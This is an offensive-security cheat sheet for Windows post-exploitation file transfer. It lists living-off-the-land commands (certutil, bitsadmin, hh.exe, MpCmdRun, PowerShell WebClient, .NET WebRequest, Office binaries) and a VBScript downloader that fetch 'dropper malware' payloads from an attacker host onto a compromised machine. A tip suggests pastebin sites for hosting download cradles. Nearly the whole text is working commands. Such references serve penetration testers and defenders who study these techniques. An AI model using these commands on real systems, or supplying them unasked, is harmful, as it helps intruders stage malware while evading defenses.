---
author(s):
  - Userware
tags:
  - post-exploitation
  - file-transfer-and-data-exfiltration
  - living-off-the-land
  - windows
---
# Download

> [!TIP]
> You can use pastebin sites that can be used to download cradles on the targets especially if you're transferring files in the internet. Use this to your advantage user.

## 01 - Command Prompt

### 1.1 - `certutil.exe`

```
C:\> certutil.exe -urlcache -split -f http[s]://<IP>[:<PORT>]/payload.exe C:\path\to\payload.exe

C:\> certutil.exe -verifyctl -f -split http[s]://<IP>[:<PORT>]/payload.exe C:\path\to\payload.exe
```

### 1.2 - `bitsadmin.exe`

```
C:\> bitsadmin.exe /rawreturn /transfer <job_name> http[s]://<IP>[:<PORT>]/payload.exe C:\path\to\payload.exe

C:\> bitsadmin.exe /create <job_name> | bitsadmin /transfer <job_name> http[s]://<IP>[:<PORT>]/payload.exe C:\path\to\payload.exe | bitsadmin /resume <job_name> | bitsadmin /complete <job_name>
```

### 1.3 - `hh.exe`

```
C:\> hh.exe http[s]://<IP>/payload.ps1
```

### 1.4 - `MpCmdRun.exe`

```
C:\> "C:\Program Files\Windows Defender\MpCmdRun.exe" -DownloadFile -url http[s]://<IP>/payload.exe -path <drive_letter>:\\path\\to\payload.exe
```

## 02 - Powershell

### 2.1 - `Invoke-WebRequest`

```
PS C:\> Invoke-WebRequest -Uri http[s]://<IP>[:<PORT>]/payload.exe -OutFile payload.exe
```

### 2.2 - DownloadFile

A one-liner for downloading the dropper malware and save the disk.

```
PS C:\> (New-Object Net.WebClient).DownloadFile('http://<IP>[:<PORT>]/payload.exe', 'payload.exe')
```

Multilines for downloading the dropper malware and save the disk.

```powershell
$storageDir = $pwd
$webclient = New-Object Net.WebClient
$url = "http[s]://<IP>[:<PORT>]/payload.exe"
$file = "shell.exe"
$webclient.DownloadFile($url, $file)
```

### 2.3 - Bitsadmin

```
PS C:\> Start-BitsTransfer -Source http[s]://<IP>/payload.exe -Destination C:\path\to\payload.exe
```

## 03 - DotNET Class

### 3.1 - WebRequest

```powershell
$webrequest = [System.Net.WebRequest]::Create("http[s]://<IP>[:<PORT>]/payload.ps1")
$response = $webrequest.GetResponse()
$responsestream = $response.GetResponseStream()
$streamreader =[System.IO.StreamReader]::new($responsestream)
$content = $streamreader.ReadToEnd()
```

## 04 - Microsoft Office

TODO: Fill in the rest of the microsoft office suite

```
C:\> WinWord.exe "http[s]://<attacker_IP>/payload.exe"

C:\> Excel.exe "http[s]://<attacker_IP>/payload.exe"

C:\> Powerpnt.exe "http[s]://<attacker_IP>/payload.exe"
```

## 05 - VBScript

```vbscript
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray, lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

Syntax usage.

```
C:\> cscript /nologo wget.vbs http[s]://<IP>:<PORT>/payload.exe payload.exe
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x00 - Enumeration and Discovery/Desktop/Windows/Host/0xD - Processes AND Services AND Software/Discover Programs/Malware Development/Helpers/Productivity Software/Office/Microsoft Office]]

### LOLBAS

- [LOLBAS: Hh](https://lolbas-project.github.io/lolbas/Binaries/Hh/#execute)

- [LOLBAS: MpCmdRun](https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/)

### Hacking Articles

- [Hacking Articles: Windows for Pentester Bitsadmin](https://www.hackingarticles.in/windows-for-pentester-bitsadmin/)

### 0xBEN

- [0xBEN: Windows File Downloads](https://notes.benheater.com/books/file-transfers-and-data-exfiltration/page/windows-file-downloads)

- [HTTP.sys web server implementation in ASP.NET Core](https://docs.microsoft.com/en-us/aspnet/core/fundamentals/servers/httpsys?view=aspnetcore-6.0)

### SS64

- [SS64 Powershell Get-BitsTransfer](https://ss64.com/ps/get-bitstransfer.html)

- [SS64 Forum Topic: Decode/Encode BASE64/HEX strings. Print symbols by HEX code.](https://ss64.org/viewtopic.php?t=99)